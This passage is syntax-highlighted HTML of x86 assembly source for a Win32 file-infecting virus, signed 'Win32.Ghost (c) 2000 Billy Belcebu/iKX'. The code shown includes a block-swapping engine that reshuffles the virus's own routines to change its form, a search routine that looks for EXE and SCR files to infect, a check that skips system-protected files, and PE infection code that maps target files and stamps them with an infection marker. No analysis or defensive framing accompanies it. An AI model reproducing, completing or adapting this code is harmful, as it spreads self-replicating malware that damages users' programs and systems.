        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">swap_routines</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; EDX = Ptr to swappable routines</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">routine_info_table</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; ESI = Ptr to RIT</span><span class="sc0">
</span><span class="sc5">crr_loop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">                                   </span><span class="sc1">; Load id of routine</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">                           </span><span class="sc1">; Compare them</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">w3g0t1t</span><span class="sc0">
        </span><span class="sc6">lodsw</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">crr_loop</span><span class="sc0">
</span><span class="sc5">w3g0t1t</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">addr2call</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">addr2call</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; ===( Swappable routines )==================================================</span><span class="sc0">

</span><span class="sc5">swap_routines</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">$</span><span class="sc0">

</span><span class="sc1">; *-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*</span><span class="sc0">
</span><span class="sc1">; | Virus signature :P                                                      |</span><span class="sc0">
</span><span class="sc1">; *-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*</span><span class="sc0">

</span><span class="sc5">signature</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc3">"Win32.Ghost (c) 2000 Billy Belcebu/iKX"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">signature_end</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">

</span><span class="sc1">; *-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*</span><span class="sc0">
</span><span class="sc1">; | Routine for mix the blocks                                              |</span><span class="sc0">
</span><span class="sc1">; *-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*</span><span class="sc0">

</span><span class="sc5">block_swapping_engine</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">rout_counter</span><span class="sc4">],</span><span class="sc5">n_routines</span><span class="sc0">
</span><span class="sc5">thereisnoloveforme</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">buffer</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">new_rit</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">get_another_rit_entry</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">n_routines</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc5">callr</span><span class="sc0">   </span><span class="sc5">r_range</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; EBX = its place in RIT struc</span><span class="sc0">
        </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">                     </span><span class="sc1">; Get a random block</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">                         </span><span class="sc1">; EAX = Address of RIT entry</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">get_another_rit_entry</span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">movsb</span><span class="sc0">                                   </span><span class="sc1">; Copy the RIT entry into</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">movsw</span><span class="sc0">                                   </span><span class="sc1">; the new RIT structure</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">                                   </span><span class="sc1">; Nulify that entry</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">cdq</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">routine_info_table</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">over_build_offs</span><span class="sc0">
</span><span class="sc5">build_offset</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">lodsw</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">      
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">build_offset</span><span class="sc0">

</span><span class="sc5">over_build_offs</span><span class="sc4">:</span><span class="sc0">                                  </span><span class="sc1">; EDX = Offset of the code</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">swap_routines</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;     of the RIT entry</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">swapped_blocks</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">swapped_blocks</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc1">; Ptr to next routine</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">new_rit</span><span class="sc4">],</span><span class="sc2">3</span><span class="sc0">         </span><span class="sc1">; Ptr to next block</span><span class="sc0">

        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">rout_counter</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">thereisnoloveforme</span><span class="sc0">       
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">end_block_swapping_engine</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">

</span><span class="sc1">; *-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*</span><span class="sc0">
</span><span class="sc1">; | Search files by wildcards (Ring-3 runtime method)                       |</span><span class="sc0">
</span><span class="sc1">; *-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*</span><span class="sc0">

</span><span class="sc5">SetNewDir</span><span class="sc4">&amp;</span><span class="sc5">InfectFilesInDirectory</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">temp_esp</span><span class="sc4">],</span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">SetCurrentDirectoryA</span><span class="sc0">
</span><span class="sc5">InfectFilesInDirectory</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">WIN32_FIND_DATA</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Search for files</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">omask</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"*.*"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">omask</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">FindFirstFileA</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">FailOccured</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SearchHandle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">SearchForMore</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">WFD_szFileName</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; Is the file found factible</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">                             </span><span class="sc1">; of being infected?</span><span class="sc0">
        </span><span class="sc5">callr</span><span class="sc0">   </span><span class="sc5">ProcessExtension</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">NotThisTime</span><span class="sc0">                     </span><span class="sc1">; Nopes.</span><span class="sc0">

        </span><span class="sc5">callr</span><span class="sc0">   </span><span class="sc5">InfectPE</span><span class="sc0">                        </span><span class="sc1">; It's a PE executable</span><span class="sc0">

</span><span class="sc5">NotThisTime</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">ebp.WIN32_FIND_DATA</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Fill this with zeroes</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">WFD_Size</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">stosb</span><span class="sc0">                           </span><span class="sc1">; Search for more filez :)</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SearchHandle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">FindNextFileA</span><span class="sc0">

        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">SearchForMore</span><span class="sc0">

</span><span class="sc5">CloseSearchHandle</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SearchHandle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">FindClose</span><span class="sc0">
</span><span class="sc5">FailOccured</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">temp_esp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">EndSetNewDir</span><span class="sc4">&amp;</span><span class="sc5">InfectFilesInDirectory</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">

</span><span class="sc5">ProcessExtension_</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">; input:</span><span class="sc0">
</span><span class="sc1">;       EDI - Pointer to file name</span><span class="sc0">
</span><span class="sc1">; output:</span><span class="sc0">
</span><span class="sc1">;       ECX - 00 - Error: not handled extension</span><span class="sc0">
</span><span class="sc1">;             01 - Possible PE file</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                         </span><span class="sc1">; Clear ECX</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc3">"."</span><span class="sc0">                          </span><span class="sc1">; Search for da point</span><span class="sc0">
        </span><span class="sc6">scasb</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">; Get the extension</span><span class="sc0">

        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00202020h</span><span class="sc0">                   </span><span class="sc1">; Make it lowercase</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc3">"exe"</span><span class="sc0">                       </span><span class="sc1">; EXE?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">MaybePE</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc3">"rcs"</span><span class="sc0">                       </span><span class="sc1">; SCR?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">NotHandledExtension</span><span class="sc0">
</span><span class="sc5">MaybePE</span><span class="sc4">:</span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">NotHandledExtension</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">EndProcessExtension</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">

</span><span class="sc1">; *-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*</span><span class="sc0">
</span><span class="sc1">; | Infect PE                                                               |</span><span class="sc0">
</span><span class="sc1">; *-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*</span><span class="sc0">

</span><span class="sc5">InfectPEfile</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SfcIsFileProtected</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">NotInWin2k</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">                             </span><span class="sc1">; See if file is protected </span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00h</span><span class="sc0">                             </span><span class="sc1">; with SFC functions</span><span class="sc0">
        </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">SfcIsFileProtected</span><span class="sc0">

        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; If so, don't infect</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">ExitInfectPE</span><span class="sc0">

</span><span class="sc5">NotInWin2k</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">80h</span><span class="sc0">                             </span><span class="sc1">; Destroy hostile attributes</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">SetFileAttributesA</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; Open file for R/W</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">03h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0C0000000h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">CreateFileA</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">ExitInfectPE</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileHandle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; Save handle of opened file</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">GetFileSize</span><span class="sc0">                     </span><span class="sc1">; Get its size</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">total_size</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                         </span><span class="sc1">; EBX = 0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; push size</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">04h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">                             </span><span class="sc1">; push handle</span><span class="sc0">
        </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">CreateFileMappingA</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">                             </span><span class="sc1">; ECX = Size to map</span><span class="sc0">

        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">CloseFileExitInfectPE</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MapHandle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">02h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">MapViewOfFile</span><span class="sc0">

        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">UnMap</span><span class="sc4">&amp;</span><span class="sc5">CloseMap</span><span class="sc4">&amp;</span><span class="sc5">FileExitInfectPE</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MapAddress</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">3Ch</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc3">"EP"</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">UnMap</span><span class="sc4">&amp;</span><span class="sc5">CloseMap</span><span class="sc4">&amp;</span><span class="sc5">FileExitInfectPE</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4Ch</span><span class="sc4">],</span><span class="sc3">"EGAR"</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">UnMap</span><span class="sc4">&amp;</span><span class="sc5">CloseMap</span><span class="sc4">&amp;</span><span class="sc5">FileExitInfectPE</span><span class="sc0">

        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">58h</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4Ch</span><span class="sc4">],</span><span class="sc3">"EGAR"</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">

    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">06h</span><span class="sc4">]</span><span class="sc0">
